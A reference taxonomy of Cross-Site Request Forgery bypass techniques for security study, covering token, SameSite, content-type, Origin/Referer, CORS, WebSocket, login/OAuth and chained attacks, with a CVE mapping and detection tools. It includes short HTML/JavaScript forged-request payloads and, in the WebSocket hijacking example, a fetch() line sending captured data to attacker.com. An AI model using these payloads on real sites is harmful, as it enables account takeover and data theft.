# Cross-Site Request Forgery (CSRF) Mutation/Variation Taxonomy

---

## Classification Structure

Cross-Site Request Forgery (CSRF) exploits the trust that a web application places in the user's browser. When a browser sends a request to a server, it automatically includes credentials (cookies, HTTP authentication) associated with that origin. CSRF attacks leverage this behavior by tricking the victim's browser into issuing state-changing requests to a target application where the victim is already authenticated.

The taxonomy below organizes the entire CSRF mutation space along three orthogonal axes:

- **Axis 1 — Defense Bypass Target** (primary axis): The specific defense mechanism or architectural assumption being subverted. This structures the main body of the document into 8 top-level categories.
- **Axis 2 — Discrepancy Type** (cross-cutting axis): The nature of the mismatch or gap that enables the bypass. Each technique exploits one or more of the discrepancy types listed below.
- **Axis 3 — Attack Scenario** (mapping axis): The real-world exploitation context where the technique achieves impact.

### Axis 2: Discrepancy Types (Cross-Cutting)

| Code | Discrepancy Type | Description |
|------|-----------------|-------------|
| **D1** | Token Absence Tolerance | Server accepts requests with missing or empty CSRF tokens |
| **D2** | Token-Session Decoupling | Token is not cryptographically bound to the user's session |
| **D3** | Method Confusion | Different validation logic for different HTTP methods (GET vs POST) |
| **D4** | Content-Type Leniency | Server accepts unexpected or manipulated content types |
| **D5** | Header Suppression | Missing validation headers (Origin, Referer) treated as valid |
| **D6** | Cookie Scope Confusion | Mismatch between same-site and cross-origin boundary semantics |
| **D7** | Protocol Confusion | Different authentication enforcement across protocols (HTTP vs WebSocket) |
| **D8** | Timing Window | Grace periods or race conditions in token/cookie validation |

### Axis 3: Attack Scenarios

| Scenario | Description |
|----------|-------------|
| **State Modification** | Password change, email change, settings update, post creation |
| **Account Takeover** | Credential change, session hijack via chained vulnerabilities |
| **Financial Fraud** | Unauthorized transactions, fund transfers |
| **Privilege Escalation** | Admin action execution via forged requests |
| **Data Exfiltration** | Bidirectional communication hijack (WebSocket) |
| **Chain Attack** | XSS→CSRF, CSRF→Session Fixation, Login CSRF→Self-XSS |

### Fundamental Prerequisite

For any CSRF variant to be exploitable, three conditions must be met simultaneously:

1. **Relevant Action** — The target application exposes a state-changing endpoint
2. **Cookie-Based Authentication** — The session is maintained via cookies that the browser attaches automatically
3. **No Unpredictable Parameters** — The request contains no values that the attacker cannot determine or control

Every technique in this taxonomy attacks one or more of the layers designed to introduce "unpredictable parameters" or restrict automatic cookie attachment.

---

## §1. CSRF Token Validation Bypass

CSRF tokens are the oldest and most widely deployed defense. They work by embedding a server-generated, unpredictable value into forms or request headers, which the server validates on each state-changing request. This section covers mutations that subvert token-based defenses without needing to know the token value.

### §1-1. Token Parameter Manipulation

These techniques exploit weak validation logic that fails to enforce strict token presence and integrity checks.

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **Token Removal** | Delete the entire CSRF token parameter from the request. Many servers only validate the token *if it is present*, silently skipping validation when the parameter is absent. | D1 | Server uses conditional validation (`if token exists, validate it`) instead of mandatory validation |
| **Empty Token Submission** | Submit the token parameter with an empty value (`csrf_token=`). Some validators check for parameter presence but not value emptiness. | D1 | Validator checks `isset()` but not `!empty()` |
| **Arbitrary Value Substitution** | Replace the token value with a random string of the same length. Weak validators may only check token length or format rather than comparing against the stored value. | D1 | Token validation uses length/format check instead of cryptographic comparison |
| **Duplicate Parameter Injection** | Submit the same parameter name multiple times with different values (e.g., `csrf=valid&csrf=attacker`). Depending on the server-side framework, it may use the first, last, or a concatenated value. | D1 | Parameter parsing precedence differs from validation logic |

**Example — Token Removal:**
```html
<!-- Original form -->
<form action="/change-email" method="POST">
  <input type="hidden" name="csrf_token" value="abc123">
  <input name="email" value="new@email.com">
</form>

<!-- CSRF attack: token parameter entirely removed -->
<form action="https://target.com/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
  <script>document.forms[0].submit();</script>
</form>
```

### §1-2. Token-Session Binding Failures

These techniques exploit tokens that are valid but not properly bound to the requesting user's session.

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **Global Token Pool** | The server maintains a single pool of valid tokens shared across all sessions. An attacker logs in with their own account, obtains a valid token, and injects it into a CSRF payload targeting the victim. | D2 | Tokens are validated against a global set rather than per-session storage |
| **Cross-Session Token Reuse** | Tokens are not invalidated when a new session begins or when the user re-authenticates. Old tokens remain valid across session boundaries. | D2 | No session-token binding or token rotation on session change |
| **Token Fixation** | Attacker sets a known token value via cookie injection (when the token is stored in a cookie) on a subdomain, then forges requests using that known token. | D2 + D6 | Token stored in cookie + attacker controls a subdomain |

**Example — Global Token Pool:**
```python
# Attacker obtains their own valid CSRF token
attacker_token = login_and_get_csrf_token("attacker_account")

# This token works for ANY user's session
payload = f'''
<form action="https://target.com/change-password" method="POST">
  <input name="csrf_token" value="{attacker_token}">
  <input name="new_password" value="hacked123">
  <script>document.forms[0].submit();</script>
</form>'''
```

### §1-3. Double Submit Cookie Bypass

The Double Submit Cookie pattern sends the same token value in both a cookie and a request parameter. The server compares the two — if they match, the request is accepted. This pattern is stateless but has known weaknesses.

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **Subdomain Cookie Injection** | An attacker controlling a subdomain (via takeover or XSS) sets a cookie with a known value on the parent domain. The attacker then submits that same known value as the request parameter, achieving a valid match. | D6 | Attacker controls a sibling/sub domain; tokens are unsigned |
| **Cookie Jar Overflow** | The browser has a limit on cookies per domain. By flooding the cookie jar, the attacker can evict the legitimate CSRF cookie and inject a known replacement. | D6 | Browser cookie limits can be triggered; tokens are unsigned |
| **Unsigned Token Comparison** | Without HMAC signing, the server merely compares cookie value to parameter value. Since the attacker can control both (via cookie injection), the defense collapses. | D2 | No HMAC or server-side secret binding |

---

## §2. SameSite Cookie Restriction Bypass

Modern browsers default to `SameSite=Lax` for cookies without an explicit attribute, which blocks cookies on cross-site POST requests while allowing them on top-level GET navigations. `SameSite=Strict` blocks cookies on all cross-site requests. These bypasses subvert this browser-level defense.

### §2-1. Lax Mode Bypasses

`SameSite=Lax` allows cookies on cross-site requests that meet two criteria: (1) the request uses the GET method, and (2) it results from a top-level navigation (e.g., clicking a link). These conditions create a measurable attack surface.

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **GET-Based State Change** | If the application accepts state-changing operations via GET requests (e.g., `/transfer?to=attacker&amount=1000`), a simple link or `document.location` redirect suffices for CSRF. | D3 | Endpoint accepts state changes via GET method |
| **Method Override Parameter** | Frameworks like Symfony, Laravel, and Rails support `_method` parameters that override the HTTP method at the application layer. A GET request with `_method=POST` is treated as POST by the framework while the browser treats it as GET (sending Lax cookies). | D3 | Framework supports `_method`, `X-HTTP-Method-Override`, or similar |
| **Client-Side Redirect Gadget** | A page on the target site contains a DOM-based redirect using attacker-controllable input (e.g., `window.location = params.get('url')`). The attacker navigates to this page, which then redirects to the sensitive endpoint — and the browser treats the redirect as a same-site request, attaching all cookies. | D6 | Target site has a client-side open redirect vulnerability |
| **Lax+POST 2-Minute Window** | Chrome applies a 120-second grace period for cookies without an explicit SameSite attribute: during this window, Lax cookies are also sent on cross-site top-level POST requests. Attackers trigger a fresh cookie issuance (e.g., via SSO/OAuth redirect) and race to exploit within the window. | D8 | Cookie has no explicit SameSite attribute (relying on browser default); attacker can trigger fresh cookie issuance |

**Example — Method Override:**
```html
<form action="https://target.com/account/change-email?_method=POST" method="GET">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

**Example — Lax+POST Window:**
```html
<script>
  // Step 1: Force new session cookie via OAuth
  window.onclick = () => {
    window.open('https://target.com/login/sso');
  };
  // Step 2: Within 2 minutes, submit CSRF via top-level POST
  setTimeout(() => {
    document.getElementById('csrf-form').submit();
  }, 3000);
</script>
<form id="csrf-form" action="https://target.com/change-password" method="POST">
  <input name="new_password" value="hacked">
</form>
```

### §2-2. Same-Site Boundary Exploitation

The critical distinction between **site** and **origin** creates a class of bypasses. A "site" is defined as the scheme + eTLD+1 (effective top-level domain plus one label). Thus, `app.example.com` and `blog.example.com` are same-site but cross-origin. Requests between them carry all cookies regardless of SameSite settings.

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **Sibling Domain XSS** | An XSS vulnerability on any subdomain under the same eTLD+1 allows the attacker to issue requests to the target subdomain with full cookie context, completely bypassing SameSite restrictions. | D6 | XSS on any subdomain of the same registrable domain |
| **Subdomain Takeover** | A dangling DNS record (e.g., `old.example.com` CNAME pointing to a decommissioned service) allows an attacker to claim the subdomain. Requests from the attacker-controlled subdomain to the main application are treated as same-site. | D6 | Dangling CNAME or A record on a subdomain |
| **Shared Hosting / Wildcard** | On shared hosting platforms or CDNs that assign subdomains under a common domain (e.g., `user1.platform.com`), one tenant's malicious page can CSRF another tenant's application. | D6 | Application runs on a shared-domain hosting platform |

### §2-3. SameSite=None Exploitation

When cookies are explicitly set to `SameSite=None` (required with the `Secure` flag), the browser attaches them to all cross-site requests. This setting is common for cross-origin SSO, embedded widgets, and third-party integrations.

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **Direct Cross-Site Forgery** | Standard CSRF attacks work without modification since the browser sends the cookie on every request regardless of origin. | D6 | Cookie set with `SameSite=None; Secure` and no additional CSRF defense |
| **Third-Party Context Abuse** | Applications that require `SameSite=None` for legitimate cross-origin functionality (e.g., embedded payment forms, OAuth) expose themselves to CSRF if no token-based defense is layered on top. | D6 | Business requirement forces `SameSite=None` |

### §2-4. Service Worker / Fetch API Bypass

Modern browser APIs can interact with SameSite policies in unexpected ways.

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **Service Worker FetchEvent Bypass** | In certain browser implementations (notably Firefox, pre-patch), requests intercepted and re-issued by a Service Worker's `FetchEvent` handler bypass SameSite restrictions. The browser sends protected cookies even on cross-site requests when the request passes through a Service Worker. | D6 + D7 | Target application registers a Service Worker with a `FetchEvent` handler; victim uses a vulnerable browser version |
| **Fetch API Credential Modes** | Using `fetch()` with `credentials: 'include'` in combination with permissive CORS headers (`Access-Control-Allow-Credentials: true`) enables cross-origin requests with cookies. While this is not a SameSite bypass per se, it circumvents the intended cross-origin isolation when CORS is misconfigured. | D6 | Permissive CORS configuration with wildcard or reflected origins |

---

## §3. Content-Type and Request Format Manipulation

CORS (Cross-Origin Resource Sharing) restricts which cross-origin requests can be made without a preflight check. "Simple requests" — those using `GET`, `HEAD`, or `POST` with content types `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain` — are sent directly without preflight. CSRF attacks exploit this distinction by crafting requests that qualify as "simple" while still being processed by the server.

### §3-1. Content-Type Switching

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **JSON via text/plain** | The server expects `application/json` but also accepts `text/plain`. An HTML form with `enctype="text/plain"` can submit a payload structured to be valid JSON. The form input's `name` attribute contains the JSON body up to a key-value boundary, and the `value` completes the structure. | D4 | Server parses request body as JSON regardless of Content-Type header |
| **JSON via form-urlencoded** | Some server-side parsers (e.g., Express `body-parser` with extended options) will parse `application/x-www-form-urlencoded` data into objects that match the expected JSON structure when using array/object bracket notation (`user[name]=attacker`). | D4 | Framework body parser accepts multiple content types for the same route |
| **JSON via multipart/form-data** | Constructing multipart form data where a part contains a JSON payload. Some servers extract the first part's body and parse it as JSON. | D4 | Server extracts and parses raw body from multipart parts |

**Example — JSON CSRF via text/plain:**
```html
<form action="https://target.com/api/change-email" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}' type="hidden">
  <input type="submit">
</form>
<!-- Resulting body: {"email":"attacker@evil.com","ignore":"="} -->
```

### §3-2. GraphQL-Specific Format Abuse

GraphQL endpoints present unique CSRF surfaces due to their flexible input handling.

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **GET-Based GraphQL Mutations** | GraphQL mutations sent as GET query parameters bypass both SameSite=Lax and Content-Type restrictions. While the GraphQL specification recommends POST for mutations, many implementations accept GET. | D3 + D4 | GraphQL server accepts mutations via GET method |
| **Form-Encoded GraphQL** | Submitting the `query` parameter as `application/x-www-form-urlencoded` form data. The GraphQL server processes it identically to a JSON POST. | D4 | Server accepts `query` parameter in form-encoded format |
| **Query Aliasing for Batching** | Using GraphQL aliases to execute multiple mutations in a single form-encoded request, amplifying the impact of a single CSRF. | D4 | No per-operation CSRF validation; batch/alias support enabled |

**Example — GET-Based GraphQL CSRF:**
```html
<img src="https://target.com/graphql?query=mutation{changeEmail(email:\"attacker@evil.com\"){success}}">
```

### §3-3. Content-Type Validation Bypass

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **MIME Type Parameter Injection** | Adding extraneous parameters to the Content-Type header (e.g., `application/json; charset=utf-8; boundary=abc`) may confuse validation logic that uses string matching rather than MIME type parsing. | D4 | Server validates Content-Type via substring match instead of proper MIME parsing |
| **Case Sensitivity Exploitation** | Some validators check Content-Type case-sensitively (e.g., accepting `Application/Json` but rejecting `application/json`). | D4 | Case-sensitive string comparison for Content-Type |
| **Charset Manipulation** | Including unexpected charset values (e.g., `application/x-www-form-urlencoded; charset=ibm500`) may cause the server to misinterpret the body encoding while still processing it. | D4 | Server honors charset parameter in unexpected ways |

---

## §4. Origin and Referer Validation Bypass

Some applications validate the `Origin` or `Referer` HTTP headers as a CSRF defense, checking that requests originate from the expected domain. These headers are set by the browser and cannot normally be overridden by JavaScript, but the validation logic itself is often flawed.

### §4-1. Header Suppression

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **Referer Header Removal** | Using `<meta name="referrer" content="no-referrer">` or the `Referrer-Policy: no-referrer` header suppresses the Referer header entirely. If the server validates the Referer only when present and permits requests without it, the attack succeeds. | D5 | Server implements `if (referer exists) { validate } else { allow }` |
| **Origin Header Absence** | Certain request types (e.g., requests triggered by `<img>` tags, `<form>` submissions in some browsers, or same-origin redirects) may omit the `Origin` header. If the server fails open when Origin is absent, CSRF is possible. | D5 | Server permits requests lacking the Origin header |
| **Redirect-Based Header Stripping** | A chain of redirects (e.g., from `data:` URI or certain protocols) may cause the browser to strip the Origin/Referer from the final request. | D5 | Server does not enforce Origin validation after redirect chains |

### §4-2. Validation Logic Flaws

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **Substring Matching** | The validator checks if the trusted domain appears *anywhere* in the Origin/Referer value. Attacker registers a domain like `trusted-domain.com.attacker.com` or `attacker.com/trusted-domain.com`. | D5 | Validation uses `contains()` or `indexOf()` instead of exact domain comparison |
| **Suffix Matching** | Validation checks if the Origin ends with the trusted domain. Attacker registers `attackertrusted.com`. | D5 | Validation uses `endsWith()` without requiring a domain boundary (`.` or `://`) |
| **Subdomain Wildcard** | The validator accepts any subdomain of the trusted domain. The attacker exploits a subdomain takeover or XSS on a subdomain to send requests with a valid Origin. | D5 + D6 | Validation accepts `*.trusted.com`; attacker controls a subdomain |
| **Null Origin Acceptance** | Some validators explicitly whitelist the `null` origin. Requests from sandboxed iframes (`<iframe sandbox="allow-scripts">`) or `data:` URIs carry `Origin: null`. | D5 | Server whitelists `Origin: null` |
| **Scheme-Agnostic Matching** | The validator compares only the hostname portion, ignoring the scheme. Attackers on HTTP (via MITM or mixed content) can inject requests with a matching hostname. | D5 | No scheme validation in Origin comparison |

**Example — Null Origin via Sandboxed iframe:**
```html
<iframe sandbox="allow-scripts allow-forms" srcdoc='
  <form action="https://target.com/change-email" method="POST">
    <input name="email" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
'>
</iframe>
<!-- This request carries "Origin: null" -->
```

---

## §5. Cross-Origin Resource Sharing (CORS) Misconfiguration Exploitation

While CORS is primarily designed to relax the Same-Origin Policy for legitimate cross-origin communication, its misconfiguration can enable or amplify CSRF attacks — particularly when the attacker needs to read the response (e.g., to extract tokens or sensitive data).

### §5-1. Permissive CORS as CSRF Enabler

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **Reflected Origin** | The server dynamically sets `Access-Control-Allow-Origin` to the value of the request's `Origin` header, effectively allowing any origin. Combined with `Access-Control-Allow-Credentials: true`, this enables cross-origin requests with cookies AND response reading. | D5 + D6 | ACAO reflects Origin; ACAC is true |
| **Null Origin Allowance** | The server's CORS configuration includes `null` in its allowlist. Attackers use sandboxed iframes to generate `Origin: null` requests with credentials. | D5 | ACAO includes `null`; ACAC is true |
| **Wildcard with Subdomain** | The server allows `*.trusted.com` in CORS configuration. An attacker exploiting any subdomain can make credentialed cross-origin requests and read responses. | D6 | Wildcard subdomain CORS + attacker controls subdomain |

### §5-2. Preflight Bypass via Simple Requests

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **Simple Request Exploitation** | Even without CORS misconfiguration, the browser sends "simple" cross-origin requests (GET/POST with standard content types) without preflight. The server processes the request and performs the action — CORS only prevents the attacker from *reading* the response, not from *causing the side effect*. | D4 | State-changing endpoint accepts simple-request content types |
| **Custom Header Avoidance** | Some applications require a custom header (e.g., `X-Requested-With`) as CSRF defense, since custom headers trigger preflight. Attackers find endpoints that don't enforce the custom header requirement. | D5 | Inconsistent custom header enforcement across endpoints |

---

## §6. Protocol and Channel Exploitation

CSRF is not limited to traditional HTTP form submissions. Alternative protocols and communication channels accessible from the browser present distinct attack surfaces.

### §6-1. Cross-Site WebSocket Hijacking (CSWSH)

WebSocket connections begin with an HTTP handshake that carries cookies. Once established, the connection is bidirectional and persistent. If the handshake lacks CSRF protection, an attacker can establish a WebSocket connection in the victim's authenticated context.

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **Missing Origin Validation** | The WebSocket server does not validate the `Origin` header during the handshake. An attacker's page establishes a WebSocket to the target and can send/receive arbitrary messages. | D7 | No Origin check on WebSocket handshake |
| **Cookie-Only WebSocket Auth** | The WebSocket handshake relies solely on cookies for authentication, with no ticket/token in the URL or first message. Since browsers attach cookies to WebSocket handshakes, cross-origin connections inherit the victim's session. | D7 | SameSite=None on session cookies (required for cross-origin WebSocket); no additional auth in handshake |
| **GraphQL over WebSocket** | GraphQL subscriptions (and sometimes mutations) are served over WebSocket. The WebSocket handshake may not enforce the same CSRF protections as the HTTP GraphQL endpoint, enabling mutation execution through the WebSocket channel. | D7 + D4 | GraphQL endpoint accessible via WebSocket without per-message authentication |

**Example — CSWSH:**
```html
<script>
  var ws = new WebSocket('wss://target.com/ws');
  ws.onopen = function() {
    // Send mutation through hijacked WebSocket
    ws.send(JSON.stringify({
      type: 'mutation',
      query: 'mutation { deleteAccount { success } }'
    }));
  };
  ws.onmessage = function(event) {
    // Exfiltrate response data
    fetch('https://attacker.com/log?data=' + encodeURIComponent(event.data));
  };
</script>
```

### §6-2. Alternative Request Initiators

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **HTML Tag-Based Requests** | Tags like `<img>`, `<script>`, `<link>`, `<video>`, `<object>`, and `<iframe>` trigger GET requests with cookies. These bypass some JavaScript-based CSRF restrictions. | D3 | Sensitive action available via GET |
| **Form-Based Cross-Origin POST** | Standard HTML `<form>` submissions with `method="POST"` are not subject to CORS preflight. The browser sends the request with cookies and the target processes it — even though the attacker cannot read the response. | D4 | No CSRF token required; SameSite=None or same-site context |
| **`navigator.sendBeacon()`** | This API sends POST requests with credentials after page unload. It is useful for fire-and-forget CSRF where the attacker doesn't need a response and wants to avoid the victim seeing a page navigation. | D4 | Beacon requests are POST with `text/plain`; server accepts this content type |

---

## §7. Authentication Context Manipulation

These techniques target the authentication flow itself rather than authenticated actions, forging the context in which authentication occurs.

### §7-1. Login CSRF

Login CSRF forces the victim's browser to authenticate as the attacker. This is often overlooked because no "damage" is immediately apparent to the user — but it enables powerful chain attacks.

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **Attacker Account Login** | The victim is logged into the attacker's account without their knowledge. Any data the victim subsequently enters (search history, saved addresses, uploaded documents) is captured under the attacker's account. | D1 | Login form has no CSRF token; no pre-session token binding |
| **Login CSRF + Self-XSS** | A Self-XSS vulnerability (only exploitable in the user's own session) becomes weaponized: the attacker first uses Login CSRF to log the victim into the attacker's account (where the Self-XSS payload is planted), then redirects the victim to the vulnerable page. The XSS executes in the victim's browser with full session context. | D1 + D6 | Login CSRF + Self-XSS on the same application |
| **Login CSRF + OAuth** | Using OAuth login CSRF to force the victim into the attacker's session, then leveraging the `redirect_uri` to navigate the victim to a page where a Self-XSS or other vulnerability triggers. The OAuth `state` parameter is either missing or not validated. | D1 + D2 | OAuth implementation without state parameter validation |

### §7-2. OAuth / SSO Flow CSRF

OAuth 2.0 and SSO protocols involve multiple redirect steps, each presenting a CSRF surface.

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **Missing State Parameter** | The OAuth authorization response (containing the `code` or `token`) is submitted back to the client application without a `state` parameter binding it to the original request. An attacker initiates an OAuth flow, captures the callback URL with their authorization code, and tricks the victim into visiting it — binding the attacker's external account to the victim's session. | D2 | OAuth implementation omits or doesn't validate the `state` parameter |
| **State Parameter Reuse** | The `state` parameter is generated but not bound to the user's session or is reusable. An attacker captures a valid state value and replays it. | D2 | State is not session-bound or is not invalidated after use |
| **Token Endpoint CSRF** | The token exchange endpoint accepts cross-origin requests with the authorization code. An attacker who obtains a code (e.g., via referrer leakage) can exchange it for a token from their own origin. | D7 | Token endpoint lacks Origin validation or CORS restrictions |

### §7-3. Session Fixation via CSRF

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **Cookie Injection for Session** | Using a subdomain or a cookie-setting vulnerability to inject a known session ID into the victim's browser. When the victim logs in, the server authenticates the attacker-known session. | D6 | Server does not regenerate session ID on login |
| **Pre-Session Token Manipulation** | Applications that use pre-sessions (anonymous sessions before login) for CSRF tokens may allow an attacker to fixate the pre-session and thus know the CSRF token that will be used post-login. | D2 + D8 | Pre-session survives authentication without regeneration |

---

## §8. Chain Attacks and Amplification

CSRF rarely exists in isolation in modern applications. Its most impactful exploitation comes through chaining with other vulnerability classes.

### §8-1. XSS → CSRF Chains

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **Token Extraction via XSS** | An XSS payload makes an XMLHttpRequest to the form page, extracts the CSRF token from the DOM, and uses it to submit a forged request. This bypasses all token-based CSRF defenses since the token is read from the legitimate page. | — (XSS nullifies CSRF defense) | Reflected or Stored XSS on any page of the application |
| **XSS Bypass of SameSite** | JavaScript executing within the target origin is inherently same-origin. All SameSite restrictions are irrelevant because the requests originate from the trusted site itself. | D6 | XSS on target domain |
| **Stored XSS + CSRF for ATO** | A Stored XSS payload injects a CSRF form that changes the victim's email/password. The XSS reads the CSRF token, constructs the request, and submits it — achieving account takeover without user interaction beyond visiting the page. | — | Stored XSS + password change without current password verification |

### §8-2. Clickjacking → CSRF Chains

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **UI Redressing CSRF** | The target page is embedded in an invisible iframe and positioned so the user's click on an attacker-controlled button actually clicks a submit button on the target form. This inherits the user's full session context and bypasses CSRF tokens (since the legitimate form with its token is being submitted). | — (legitimate form is submitted) | Target page is frameable (no `X-Frame-Options` or CSP `frame-ancestors`) |
| **Drag-and-Drop CSRF** | Advanced clickjacking variant where the user is tricked into dragging content from the target page (e.g., a CSRF token visible in the DOM) into an attacker-controlled context, enabling token exfiltration without XSS. | D2 | Target page is frameable; sensitive tokens are in the visible DOM |

### §8-3. DNS Rebinding → CSRF Chains

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **SOP Bypass via DNS Rebinding** | The attacker's domain initially resolves to the attacker's IP, then after the victim loads the malicious page, the DNS record is changed to resolve to the target's internal IP. The browser treats subsequent requests as same-origin (same domain), bypassing SOP and enabling full CSRF token extraction and request forgery. | D6 + D7 | Short DNS TTL; target accessible from victim's network (e.g., internal services) |
| **Internal Service CSRF** | DNS rebinding enables CSRF against internal services (e.g., routers, Docker APIs, cloud metadata) that have no CSRF protection because they were never intended to be accessed from the internet. | D1 + D7 | Internal service with no authentication or cookie-only auth |

### §8-4. File Upload → CSRF Chains

| Subtype | Mechanism | Discrepancy | Key Condition |
|---------|-----------|-------------|---------------|
| **Uploaded HTML/SVG XSS** | Malicious HTML or SVG files uploaded to the target domain execute JavaScript in the target's origin, enabling token extraction and CSRF submission. | D6 | File upload without content sanitization; files served from same origin |
| **PDF JavaScript Execution** | PDF files with embedded JavaScript, when opened in the browser's built-in viewer from the target's origin, can make same-origin requests and read CSRF tokens. | D6 | PDF served from same origin; browser renders PDF with JS support |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories |
|----------|-------------|---------------------------|
| **State Modification** | Standard web application with form-based actions | §1 + §2 + §3 |
| **Account Takeover** | Email/password change, OAuth linking | §1 + §7 + §8-1 |
| **Financial Fraud** | Banking, payment, transfer endpoints | §1 + §2-1 + §4 |
| **Privilege Escalation** | Admin panels, role assignment | §2-2 + §5 + §8-2 |
| **Data Exfiltration** | WebSocket-based APIs, real-time dashboards | §6-1 + §8-3 |
| **Internal Network Attack** | IoT devices, routers, CI/CD, cloud metadata | §8-3 + §6-2 |
| **Chain-Based ATO** | Self-XSS + Login CSRF, XSS + CSRF | §7-1 + §8-1 |

---

## CVE / Bounty Mapping (2023–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §2-3 (SameSite=None) + §1-1 (No token) | CVE-2025-34291 (Langflow AI) | `refresh_token_lf` cookie set to `SameSite=None` with no CSRF protection on `/api/v1/refresh` — session hijack leading to account takeover and RCE |
| §2-2 (Same-site boundary) + §2-1 (Redirect gadget) | CVE-2024-48962 (Apache OFBiz) | SameSite bypass via URL parameter redirect leading to SSTI + CSRF → RCE. Affects OFBiz < 18.12.17 |
| §2-3 (SameSite=None) + §1-1 (Missing token) | CVE-2024-42212 (HCL BigFix) | Missing SameSite attribute allows CSRF via cross-origin requests using authenticated sessions |
| §1-1 (Token absence) + §6-2 (Form POST) | CVE-2024-20252/20254 (Cisco Expressway) | CSRF on web management interface — unauthenticated attacker performs arbitrary actions. CVSS 9.6 (CVE-2024-20255 is a separate finding with CVSS 8.2, see row below) |
| §1-1 + §3 (Content-Type bypass) | CVE-2024-20255 (Cisco Expressway) | CSRF changes system configuration, resulting in DoS via credential override |
| §1-1 (No CSRF) + §6-2 (CLI execution) | Cisco IOS XE WebUI CSRF | CSRF on management interface enables CLI command execution as authenticated user |
| §5-2 (Simple request) + §3-2 (GraphQL GET) | GitLab GraphQL CSRF (HackerOne #1122408) | GET-based GraphQL mutations bypass X-CSRF-Token validation — account modification via CSRF |
| §2-4 (Service Worker bypass) | Mozilla Bug #1658869 (Firefox) | Service Worker FetchEvent bypasses SameSite cookie policy — sending protected cookies on cross-site requests |
| §6-1 (CSWSH) + §3-2 (GraphQL WS) | Include Security Research (2025) | GraphQL API protected against direct CSRF but accessible via WebSocket without Origin validation — arbitrary API calls including account deletion |
| §7-2 (OAuth state) + §7-1 (Login CSRF) | Multiple OAuth implementations | Missing state parameter allows attacker's OAuth code to be bound to victim's session — account linkage takeover |
| §1-3 (Double submit bypass) + §2-2 (Subdomain takeover) | Various bug bounty reports | Subdomain takeover enables cookie injection, breaking unsigned double-submit cookie protection |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **XSRFProbe** (offensive) | Full-site CSRF audit | Crawling engine with automatic token detection, strength analysis, and PoC generation. Identifies token absence, weak tokens, and bypass conditions |
| **Bolt** (offensive) | CSRF scanning | Python3-based scanner with crawling capability. Detects missing CSRF tokens on state-changing endpoints |
| **Burp Suite CSRF PoC Generator** (offensive) | Individual request testing | Generates HTML CSRF proof-of-concept from intercepted requests. Supports form-based and XHR-based payloads |
| **OWASP CSRFTester** (offensive) | Application-wide testing | Proxy-based tool that monitors browser requests and identifies endpoints lacking CSRF protection |
| **Acunetix** (defensive) | Automated vulnerability scanning | Commercial scanner with CSRF detection module — identifies missing tokens, weak token patterns, and SameSite misconfigurations |
| **Sec-Fetch-Site Header Validation** (defensive) | Server-side request filtering | Browser-sent metadata header indicating request context (`same-origin`, `same-site`, `cross-site`). Cannot be spoofed by JavaScript |
| **CSRF Protector** (defensive) | PHP/Apache applications | Open-source library that automatically injects and validates CSRF tokens. Provides token rotation and logging |
| **Django CSRF Middleware** (defensive) | Django applications | Built-in middleware that enforces CSRF token validation with HMAC signing, double-submit cookie pattern, and Origin/Referer checks |
| **csurf** (defensive, **deprecated 2022**) | Express.js applications | Deprecated September 2022. Alternatives such as `csrf-csrf` and `lusca` are recommended. Original functionality: CSRF token generation/validation with cookie and session-based token storage |

---

## Summary: Core Principles

### The Root Cause

CSRF exists because of a fundamental design property of the web: **ambient authority**. Browsers automatically attach credentials (cookies, HTTP authentication, client certificates) to every request sent to a domain, regardless of what initiated that request. This means that any page on the internet can cause a user's browser to make an authenticated request to any other site the user is logged into. The request is indistinguishable from a legitimate user-initiated one at the network level.

### Why Incremental Fixes Fail

The history of CSRF defense is a history of partial mitigations that each leave gaps:

- **CSRF tokens** are the most robust defense but require correct implementation — tokens must be unpredictable, session-bound, and validated on every state-changing request. In practice, tokens are frequently omitted on some endpoints (§1-1), decoupled from sessions (§1-2), or extractable via XSS (§8-1).
- **SameSite cookies** were intended as a browser-level silver bullet, but the `Lax` default still permits GET-based attacks (§2-1), and the same-site/cross-origin distinction creates an entire class of sibling-domain bypasses (§2-2). The 2-minute Lax+POST grace period further weakens the defense (§2-1).
- **Origin/Referer validation** is inherently fragile because headers can be suppressed (§4-1) and validation logic is prone to substring/suffix matching errors (§4-2).
